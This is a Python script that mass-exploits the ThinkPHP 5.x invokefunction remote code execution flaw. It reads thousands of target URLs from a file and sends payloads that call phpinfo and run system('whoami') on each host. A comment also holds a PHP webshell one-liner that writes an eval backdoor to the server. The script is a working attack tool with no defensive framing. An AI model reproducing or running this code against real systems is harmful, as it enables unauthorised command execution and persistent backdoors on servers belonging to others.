import re
import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'


def exploit(ip_, index):
    try:

        url = ip_ + \
            r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        # print(url)

        res = requests.get(url,
                           headers=headers, timeout=8, verify=False)
        pattern = r'<title>(.*?)</title>'
        match = re.search(pattern, res.text)
        if match:
            title = match.group(1)
            if title == 'System Error' or title == '系统发生错误':
                return
            print(title)
        if res.status_code != 200 or len(res.text) < 100:
            return
        if 'System' in res.text:
            print(res, len(res.text))
            print(index, url)

            print(res.text)
            # print(get_res.text)
            # with open(r'D:\C#\VSCODE\python\POC_EXP\代码执行_命令执行\ThinkPHP\Thinkphp5_5.0.22.txt', 'a+') as file:
            # file.write(url+line_break)

    except Exception as e:
        # print(e)
        pass


def exp(ip_, index):
    try:
        ip_ = ip_.split('/index.php')[0]
        url = ip_ + \
            r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'
        # echo "<?php @eval(\$_POST[1]);?>" > 1.php
        print(url)
        res = requests.get(url,
                           headers=headers, timeout=8, verify=False)
        print(res, len(res.text))
        print(index, url)

        print(res.text)
    except Exception as e:
        # print(e)
        pass
# url=''
# exploit(url)


threads = []
with open(r'D:\C#\VSCODE\python\POC_EXP\代码执行_命令执行\ThinkPHP\Thinkphp5_5.0.22.txt', 'r') as file:
    # with open(r'D:\Downloads\tmp\thinkphp.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+10000

        if index >= start and index <= end:
            urls.append(line.strip(line_break))

            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip)
            exp(ip, index)
            # thread = threading.Thread(target=exploit, args=(ip, index,))
            # threads.append(thread)
pool_size = 30
# print(urls)

test = True


# if test:
#     for thread in threads:
#         thread.start()

#     for thread in threads:
#         thread.join()
# else:
#     # 创建线程池
#     with ThreadPoolExecutor(max_workers=pool_size) as executor:
#         # 提交每个 URL 的请求任务
#         futures = [executor.submit(exploit, url, index)
#                    for index, url in enumerate(urls)]

#         # 获取每个请求的结果
#         for future in futures:
#             result = future.result()
